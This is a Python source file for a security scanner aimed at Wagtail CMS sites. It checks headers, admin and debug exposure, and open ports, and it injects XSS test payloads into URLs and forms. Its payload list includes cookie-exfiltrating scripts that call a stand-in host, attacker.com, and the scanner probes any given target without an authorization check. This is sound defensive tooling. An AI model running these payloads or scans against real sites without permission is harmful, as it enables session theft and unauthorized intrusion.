import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style
import socket
from urllib.parse import urljoin, urlparse
from collections import deque
from .utils import generate_input_value
import os
from datetime import datetime
import concurrent.futures
import re
from typing import Dict, List, Set, Tuple, Optional
from pathlib import Path
import logging
import sys
import time

# Ensure reports directory exists
REPORTS_DIR = Path("reports")
REPORTS_DIR.mkdir(exist_ok=True)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(REPORTS_DIR / f"wagsecure_report.log"),
        logging.StreamHandler(sys.stdout)
    ]
)

# Constants
DEFAULT_TIMEOUT = 10
MAX_WORKERS = 10
REPORTS_DIR = Path("reports")
RATE_LIMIT_DELAY = 1  # seconds between requests
PORT_SCAN_TIMEOUT = 1  # seconds for port scanning
MIN_HSTS_AGE = 31536000  # 1 year in seconds

XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert('xss')>",
    "<svg onload=alert('xss')>",
    "javascript:alert('xss')",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=",
    # Add more sophisticated payloads
    "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
    "<img src='x' onerror='fetch(\"http://attacker.com/steal?cookie=\"+document.cookie)'>",
    "<svg/onload='fetch(\"http://attacker.com/steal?cookie=\"+document.cookie)'>"
]

def validate_url(url: str) -> bool:
    """Validate the URL format."""
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except Exception:
        return False

def ensure_reports_dir():
    """Ensure the reports directory exists."""
    REPORTS_DIR.mkdir(exist_ok=True)

def scan_site(url: str, timeout: int = DEFAULT_TIMEOUT) -> None:
    """Scan a website for security vulnerabilities.
    
    Args:
        url (str): The URL of the website to scan
        timeout (int): Request timeout in seconds
        
    Raises:
        ValueError: If the URL is invalid
        requests.exceptions.RequestException: For network-related errors
    """
    if not validate_url(url):
        raise ValueError(f"Invalid URL format: {url}")
        
    logging.info(f"Starting scan for {url}")
    print(f"{Fore.CYAN}[+] Scanning {url}{Style.RESET_ALL}")
    
    try:
        ensure_reports_dir()
        
        response = requests.get(url, timeout=timeout, verify=True)
        is_wagtail = detect_wagtail(response)
        
        if not is_wagtail:
            logging.warning(f"Site {url} is not using Wagtail CMS")
            print(f"{Fore.YELLOW}[-] Site is not using Wagtail CMS. Skipping vulnerability checks.{Style.RESET_ALL}")
            return

        logging.info("Wagtail CMS detected, proceeding with vulnerability checks")
        print(f"{Fore.GREEN}[+] Wagtail CMS detected. Proceeding with vulnerability checks...{Style.RESET_ALL}")
        
        headers_info = check_security_headers(response)
        admin_exposed = check_admin_access(url)

        hostname = urlparse(url).hostname
        open_ports = check_open_ports(hostname)
        
        debug_exposed = check_debug_mode_exposure(url)
        
        xss_vulnerabilities = crawl_and_test_xss(url)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_hostname = re.sub(r'[^\w\-_.]', '_', hostname)
        report_filename = REPORTS_DIR / f"wagsecure_report_{safe_hostname}_{timestamp}.txt"
        
        generate_report(
            url=url,
            headers_info=headers_info,
            xss_forms=xss_vulnerabilities,
            open_ports=open_ports,
            debug_exposed=debug_exposed,
            admin_exposed=admin_exposed,
            filename=str(report_filename)
        )

    except requests.exceptions.SSLError as e:
        error_msg = f"SSL Certificate verification failed: {str(e)}"
        logging.error(error_msg)
        print(f"{Fore.RED}[!] {error_msg}{Style.RESET_ALL}")
    except requests.exceptions.ConnectionError as e:
        error_msg = f"Failed to connect to the server: {str(e)}"
        logging.error(error_msg)
        print(f"{Fore.RED}[!] {error_msg}{Style.RESET_ALL}")
    except requests.exceptions.Timeout as e:
        error_msg = f"Request timed out: {str(e)}"
        logging.error(error_msg)
        print(f"{Fore.RED}[!] {error_msg}{Style.RESET_ALL}")
    except requests.exceptions.RequestException as e:
        error_msg = f"Request failed: {str(e)}"
        logging.error(error_msg)
        print(f"{Fore.RED}[!] {error_msg}{Style.RESET_ALL}")
    except Exception as e:
        error_msg = f"Unexpected error: {str(e)}"
        logging.error(error_msg)
        print(f"{Fore.RED}[!] {error_msg}{Style.RESET_ALL}")

def detect_wagtail(response: requests.Response) -> bool:
    """Detect if the site is using Wagtail CMS."""
    wagtail_indicators = [
        'wagtail',
        'wagtailuserbar',
        'wagtailadmin',
        'wagtailcore',
        'wagtailimages',
        'wagtaildocs',
        'wagtailsearch',
        'wagtailusers',
        'wagtailforms',
        'wagtailredirects',
        'wagtail.contrib',
        'wagtail.api',
        'wagtail.snippets'
    ]
    
    content = response.text.lower()
    if any(indicator in content for indicator in wagtail_indicators):
        print(f"{Fore.GREEN}[+] Wagtail CMS detected ✅{Style.RESET_ALL}")
        return True
    else:
        print(f"{Fore.YELLOW}[-] Wagtail CMS not detected ⚠️{Style.RESET_ALL}")
        return False

def check_admin_access(url):
    if not url.endswith('/'):
        url += '/'
    admin_url = url + 'admin/'

    try:
        res = requests.get(admin_url, timeout=10)
        if res.status_code == 200:
            if "login" in res.text.lower() or "username" in res.text.lower():
                print(f"{Fore.RED}[!] Admin login page is publicly accessible at {admin_url} ⚠️{Style.RESET_ALL}")
                return True
            else:
                print(f"{Fore.YELLOW}[?] Admin page accessible but login form not detected{Style.RESET_ALL}")
                return True
        elif res.status_code in [301, 302]:
            print(f"{Fore.YELLOW}[?] Admin URL redirects ({res.status_code}){Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.GREEN}[+] Admin page not accessible (HTTP {res.status_code}) ✅{Style.RESET_ALL}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[!] Failed to reach admin URL: {e}{Style.RESET_ALL}")
        return False

def check_security_headers(response: requests.Response) -> Dict[str, Tuple[bool, str]]:
    """Check security headers and their values against security best practices.
    
    Args:
        response (requests.Response): The HTTP response to check headers for
        
    Returns:
        Dict[str, Tuple[bool, str]]: Dictionary mapping header names to tuples of
            (is_valid, value_or_error_message)
    """
    logging.info("Checking security headers")
    print(f"\n{Fore.CYAN}[+] Checking security headers...{Style.RESET_ALL}")

    required_headers = {
        "X-Frame-Options": {
            "description": "Prevents clickjacking",
            "valid_values": ["DENY", "SAMEORIGIN"],
            "required": True
        },
        "Content-Security-Policy": {
            "description": "Protects against XSS and data injection",
            "valid_values": None,  # Complex validation needed
            "required": True,
            "validate": lambda v: "default-src" in v.lower() and "script-src" in v.lower()
        },
        "Strict-Transport-Security": {
            "description": "Forces HTTPS",
            "valid_values": None,  # Complex validation needed
            "required": True,
            "validate": lambda v: any(f"max-age={age}" in v.lower() and int(age) >= MIN_HSTS_AGE 
                                    for age in re.findall(r'max-age=(\d+)', v.lower()))
        },
        "X-Content-Type-Options": {
            "description": "Prevents MIME sniffing",
            "valid_values": ["nosniff"],
            "required": True
        },
        "Referrer-Policy": {
            "description": "Controls what referrer info is sent",
            "valid_values": ["no-referrer", "no-referrer-when-downgrade", "origin", 
                           "origin-when-cross-origin", "same-origin", "strict-origin", 
                           "strict-origin-when-cross-origin", "unsafe-url"],
            "required": True
        },
        "Permissions-Policy": {
            "description": "Restricts browser features",
            "valid_values": None,  # Complex validation needed
            "required": False,
            "validate": lambda v: "geolocation" in v.lower() or "camera" in v.lower() or "microphone" in v.lower()
        }
    }

    headers_status = {}

    for header, info in required_headers.items():
        if header not in response.headers:
            if info["required"]:
                msg = f"Missing {header} – {info['description']}"
                logging.warning(msg)
                print(f"{Fore.RED}[!] {msg}{Style.RESET_ALL}")
                headers_status[header] = (False, "Missing")
            else:
                msg = f"Optional header {header} not present"
                logging.info(msg)
                print(f"{Fore.YELLOW}[-] {msg}{Style.RESET_ALL}")
                headers_status[header] = (False, "Not present")
        else:
            value = response.headers[header]
            if info['valid_values'] is not None:
                if value.upper() in [v.upper() for v in info['valid_values']]:
                    msg = f"{header} is properly set to {value}"
                    logging.info(msg)
                    print(f"{Fore.GREEN}[+] {msg} ✅{Style.RESET_ALL}")
                    headers_status[header] = (True, value)
                else:
                    msg = f"{header} has invalid value: {value}"
                    logging.warning(msg)
                    print(f"{Fore.YELLOW}[!] {msg} ⚠️{Style.RESET_ALL}")
                    headers_status[header] = (False, f"Invalid value: {value}")
            elif 'validate' in info:
                if info['validate'](value):
                    msg = f"{header} is properly configured"
                    logging.info(msg)
                    print(f"{Fore.GREEN}[+] {msg} ✅{Style.RESET_ALL}")
                    headers_status[header] = (True, value)
                else:
                    msg = f"{header} configuration needs improvement"
                    logging.warning(msg)
                    print(f"{Fore.YELLOW}[!] {msg} ⚠️{Style.RESET_ALL}")
                    headers_status[header] = (False, f"Needs improvement: {value}")
            else:
                msg = f"{header} is set"
                logging.info(msg)
                print(f"{Fore.GREEN}[+] {msg} ✅{Style.RESET_ALL}")
                headers_status[header] = (True, value)

    if all(status[0] for status in headers_status.values()):
        msg = "All recommended security headers are present and properly configured"
        logging.info(msg)
        print(f"{Fore.GREEN}✔️ {msg}{Style.RESET_ALL}")
    
    return headers_status

def check_open_ports(hostname: str, ports: List[int] = None) -> List[int]:
    """Scan ports concurrently with rate limiting and proper error handling.
    
    Args:
        hostname (str): The hostname to scan
        ports (List[int], optional): List of ports to scan. Defaults to common ports.
        
    Returns:
        List[int]: List of open ports found
        
    Note:
        This function implements rate limiting to avoid overwhelming the target.
    """
    if ports is None:
        ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 
                1433, 1521, 2049, 2082, 2083, 2222, 2375, 3306, 3389, 5432, 
                5900, 6379, 8000, 8080, 8443, 8888, 9200, 27017]

    logging.info(f"Starting port scan for {hostname}")
    print(f"\n{Fore.CYAN}[+] Scanning common ports on {hostname}...{Style.RESET_ALL}")
    open_ports = []

    def scan_port(port: int) -> Optional[int]:
        """Scan a single port with proper error handling."""
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(PORT_SCAN_TIMEOUT)
            try:
                result = sock.connect_ex((hostname, port))
                if result == 0:
                    msg = f"Port {port} is open"
                    logging.warning(msg)
                    print(f"{Fore.RED}[!] {msg} ⚠️{Style.RESET_ALL}")
                    return port
            except socket.gaierror:
                logging.error(f"Hostname resolution failed for {hostname}")
            except socket.timeout:
                logging.debug(f"Port {port} scan timed out")
            except socket.error as e:
                logging.error(f"Socket error while scanning port {port}: {str(e)}")
            except Exception as e:
                logging.error(f"Unexpected error while scanning port {port}: {str(e)}")
        return None

    def rate_limited_scan():
        """Scan ports with rate limiting."""
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            future_to_port = {executor.submit(scan_port, port): port for port in ports}
            for future in concurrent.futures.as_completed(future_to_port):
                port = future_to_port[future]
                try:
                    result = future.result()
                    if result is not None:
                        open_ports.append(result)
                except Exception as e:
                    logging.error(f"Error scanning port {port}: {str(e)}")
                time.sleep(RATE_LIMIT_DELAY)  # Rate limiting

    try:
        rate_limited_scan()
    except Exception as e:
        logging.error(f"Port scanning failed: {str(e)}")
        print(f"{Fore.RED}[!] Port scanning failed: {str(e)}{Style.RESET_ALL}")

    if not open_ports:
        msg = "No common ports are open"
        logging.info(msg)
        print(f"{Fore.GREEN}[+] {msg} ✅{Style.RESET_ALL}")

    return open_ports

def crawl_and_test_xss(base_url: str, max_depth: int = 0) -> List[str]:
    """Crawl website and test for various types of XSS vulnerabilities.
    
    Args:
        base_url (str): The base URL to start crawling from
        max_depth (int): Maximum depth to crawl (default: 1)
        
    Returns:
        List[str]: List of URLs with potential XSS vulnerabilities
        
    Note:
        This function implements rate limiting and tests for both reflected and DOM-based XSS.
    """
    logging.info(f"Starting XSS scan for {base_url} with max depth {max_depth}")
    print(f"\n{Fore.CYAN}[+] Crawling site (depth={max_depth}) and testing for XSS...{Style.RESET_ALL}")
    
    visited = set()
    queue = deque([(base_url, 0)])
    vulnerable_urls = []
    tested_forms = set()

    def test_reflected_xss(url: str) -> bool:
        """Test for reflected XSS vulnerabilities."""
        try:
            for payload in XSS_PAYLOADS:
                test_url = f"{url}?xss={payload}"
                response = requests.get(test_url, timeout=DEFAULT_TIMEOUT)
                if payload in response.text:
                    msg = f"Possible reflected XSS at: {test_url}"
                    logging.warning(msg)
                    print(f"{Fore.RED}[!] {msg} ⚠️{Style.RESET_ALL}")
                    return True
            return False
        except Exception as e:
            logging.error(f"Error testing reflected XSS at {url}: {str(e)}")
            return False

    def test_dom_xss(url: str) -> bool:
        """Test for DOM-based XSS vulnerabilities."""
        try:
            response = requests.get(url, timeout=DEFAULT_TIMEOUT)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Check for common DOM XSS sinks
            dom_sinks = [
                ('script', 'src'),
                ('img', 'src'),
                ('iframe', 'src'),
                ('a', 'href'),
                ('form', 'action'),
                ('input', 'value'),
                ('textarea', 'value')
            ]
            
            for tag, attr in dom_sinks:
                for element in soup.find_all(tag):
                    if element.get(attr):
                        value = element[attr]
                        if any(payload in value for payload in XSS_PAYLOADS):
                            msg = f"Possible DOM-based XSS at {url} in {tag} {attr}"
                            logging.warning(msg)
                            print(f"{Fore.RED}[!] {msg} ⚠️{Style.RESET_ALL}")
                            return True
            return False
        except Exception as e:
            logging.error(f"Error testing DOM XSS at {url}: {str(e)}")
            return False

    def test_form_xss(url: str, form: BeautifulSoup) -> bool:
        """Test a form for XSS vulnerabilities."""
        form_id = f"{url}:{form.get('method', 'get').lower()}"
        if form_id in tested_forms:
            return False
        tested_forms.add(form_id)
        
        try:
            action = form.get("action") or url
            method = form.get("method", "get").lower()
            form_url = urljoin(url, action)
            
            # Skip external forms and known safe endpoints
            if urlparse(form_url).netloc != urlparse(url).netloc:
                return False
            
            if any(safe in form_url.lower() for safe in ["/search", "/subscribe", "/contact"]):
                return False

            inputs = form.find_all(["input", "textarea"])
            if not inputs:
                return False

            data = {}
            headers = {}
            
            # Collect form data
            for inp in inputs:
                name = inp.get("name")
                if not name:
                    continue
                if "csrf" in name.lower():
                    csrf_token = inp.get("value", "")
                    if csrf_token:
                        headers["X-CSRFToken"] = csrf_token
                    continue
                if inp.get("type") in ["file", "submit", "button", "image"]:
                    continue
                data[name] = generate_input_value(inp, XSS_PAYLOADS[0])

            # Test with each payload
            for payload in XSS_PAYLOADS:
                test_data = data.copy()
                for name in test_data:
                    test_data[name] = payload

                try:
                    if method == "post":
                        response = requests.post(form_url, data=test_data, headers=headers, timeout=DEFAULT_TIMEOUT)
                    else:
                        response = requests.get(form_url, params=test_data, headers=headers, timeout=DEFAULT_TIMEOUT)

                    if payload in response.text:
                        msg = f"Possible XSS via form at: {form_url}"
                        logging.warning(msg)
                        print(f"{Fore.RED}[!] {msg} ⚠️{Style.RESET_ALL}")
                        return True
                except Exception as e:
                    logging.error(f"Error testing form at {form_url}: {str(e)}")
                    continue
                
                time.sleep(RATE_LIMIT_DELAY)  # Rate limiting
            return False
        except Exception as e:
            logging.error(f"Error processing form at {url}: {str(e)}")
            return False

    while queue:
        current_url, depth = queue.popleft()
        if current_url in visited or depth > max_depth:
            continue
        visited.add(current_url)

        try:
            response = requests.get(current_url, timeout=DEFAULT_TIMEOUT)
            logging.info(f"Crawling: {current_url} (depth {depth})")
            print(f"{Fore.BLUE}↳ Crawled: {current_url} (depth {depth}){Style.RESET_ALL}")
            
            soup = BeautifulSoup(response.text, "html.parser")
            
            # Test for XSS vulnerabilities
            if test_reflected_xss(current_url) or test_dom_xss(current_url):
                vulnerable_urls.append(current_url)
            
            # Test forms
            for form in soup.find_all("form"):
                if test_form_xss(current_url, form):
                    vulnerable_urls.append(current_url)
            
            # Enqueue internal links
            for tag in soup.find_all("a", href=True):
                href = tag['href']
                full_link = urljoin(current_url, href)
                if urlparse(full_link).netloc == urlparse(base_url).netloc:
                    if full_link not in visited:
                        queue.append((full_link, depth + 1))
            
            time.sleep(RATE_LIMIT_DELAY)  # Rate limiting
            
        except Exception as e:
            logging.error(f"Error crawling {current_url}: {str(e)}")
            print(f"{Fore.YELLOW}[-] Failed to crawl: {current_url}{Style.RESET_ALL}")
            continue

    if vulnerable_urls:
        msg = f"Found {len(vulnerable_urls)} potential XSS vulnerabilities"
        logging.warning(msg)
        print(f"\n{Fore.RED}[!] {msg} ⚠️{Style.RESET_ALL}")
    else:
        msg = "No XSS vulnerabilities found"
        logging.info(msg)
        print(f"\n{Fore.GREEN}[+] {msg} ✅{Style.RESET_ALL}")

    return vulnerable_urls

def check_debug_mode_exposure(url):
    print(f"\n{Fore.CYAN}[+] Checking for DEBUG mode exposure...{Style.RESET_ALL}")
    test_url = url.rstrip("/") + "/this-page-should-not-exist-xyz"

    try:
        res = requests.get(test_url, timeout=10)
        if res.status_code >= 500:
            if "django" in res.text.lower() and "traceback" in res.text.lower():
                print(f"{Fore.RED}[!] Django DEBUG mode appears to be ON (traceback exposed) ⚠️{Style.RESET_ALL}")
                return True
        if any(h for h in res.headers if "debug" in h.lower() or "x-view" in h.lower()):
            print(f"{Fore.YELLOW}[?] Suspicious debug-related headers found: {[h for h in res.headers if 'debug' in h.lower() or 'x-view' in h.lower()]}{Style.RESET_ALL}")
            return True

        print(f"{Fore.GREEN}[+] No signs of DEBUG mode exposure ✅{Style.RESET_ALL}")
        return False
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[!] Failed to test DEBUG mode exposure: {e}{Style.RESET_ALL}")
        return False

def generate_report(url: str, headers_info: Dict[str, Tuple[bool, str]], xss_forms: List[str], 
                   open_ports: List[int], debug_exposed: bool, admin_exposed: bool, 
                   filename: str) -> None:
    """Generate a detailed security report with proper formatting and sanitization.
    
    Args:
        url (str): The scanned URL
        headers_info (Dict[str, Tuple[bool, str]]): Security headers information
        xss_forms (List[str]): List of URLs with XSS vulnerabilities
        open_ports (List[int]): List of open ports
        debug_exposed (bool): Whether debug mode is exposed
        admin_exposed (bool): Whether admin page is exposed
        filename (str): Path to save the report
        
    Note:
        The report is sanitized to prevent any potential injection attacks.
    """
    logging.info(f"Generating security report for {url}")
    
    def sanitize_text(text: str) -> str:
        """Sanitize text to prevent injection attacks."""
        return re.sub(r'[^\w\s\-.,:;()\[\]{}<>@#$%^&*_+=|\\/"\'`~]', '', text)
    
    def format_section(title: str, content: List[str]) -> List[str]:
        """Format a section of the report."""
        return [f"\n{title}:", "=" * (len(title) + 1)] + content
    
    report_lines = []
    
    # Header
    report_lines.extend([
        f"🔒 WagSecure Security Report",
        f"📅 Generated on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"🌐 Target URL: {sanitize_text(url)}",
        "=" * 60
    ])
    
    # Security Headers
    headers_content = []
    for header, (status, value) in headers_info.items():
        symbol = "✅" if status else "❌"
        headers_content.append(f"  {symbol} {header}: {sanitize_text(value)}")
    report_lines.extend(format_section("Security Headers", headers_content))
    
    # Admin Page Exposure
    admin_content = [
        f"  {'⚠️' if admin_exposed else '✅'} Admin login page is "
        f"{'accessible' if admin_exposed else 'not accessible'}."
    ]
    report_lines.extend(format_section("Admin Page Exposure", admin_content))
    
    # XSS Vulnerabilities
    xss_content = []
    if xss_forms:
        for form_url in xss_forms:
            xss_content.append(f"  ⚠️ XSS possible at: {sanitize_text(form_url)}")
    else:
        xss_content.append("  ✅ No XSS vulnerabilities detected.")
    report_lines.extend(format_section("XSS Vulnerabilities", xss_content))
    
    # Open Ports
    ports_content = []
    if open_ports:
        for port in open_ports:
            ports_content.append(f"  ⚠️ Port {port} is open")
    else:
        ports_content.append("  ✅ No suspicious ports found open.")
    report_lines.extend(format_section("Open Ports", ports_content))
    
    # Debug Mode Exposure
    debug_content = [
        f"  {'⚠️' if debug_exposed else '✅'} Django DEBUG mode is "
        f"{'exposed' if debug_exposed else 'not exposed'}."
    ]
    report_lines.extend(format_section("Debug Mode Exposure", debug_content))
    
    # Severity Summary
    critical_count = len(xss_forms) + len(open_ports) + (1 if admin_exposed else 0)
    summary_content = [
        f"  ⚠️ Critical Issues: {critical_count}",
        f"  ✅ Passed Checks: {sum(1 for _, (status, _) in headers_info.items() if status)}"
    ]
    report_lines.extend(format_section("Severity Summary", summary_content))
    
    # Recommendations
    recommendations = []
    if critical_count > 0:
        recommendations.append("  ⚠️ Immediate Action Required:")
        if xss_forms:
            recommendations.append("    - Fix XSS vulnerabilities in forms and inputs")
        if open_ports:
            recommendations.append("    - Close unnecessary open ports")
        if admin_exposed:
            recommendations.append("    - Restrict access to admin interface")
        if debug_exposed:
            recommendations.append("    - Disable DEBUG mode in production")
    else:
        recommendations.append("  ✅ No immediate action required.")
    report_lines.extend(format_section("Recommendations", recommendations))
    
    try:
        with open(filename, "w", encoding='utf-8') as f:
            f.write("\n".join(report_lines))
        logging.info(f"Report saved to {filename}")
        print(f"\n📄 Report saved to {filename}")
    except Exception as e:
        error_msg = f"Failed to save report: {str(e)}"
        logging.error(error_msg)
        print(f"{Fore.RED}[!] {error_msg}{Style.RESET_ALL}")
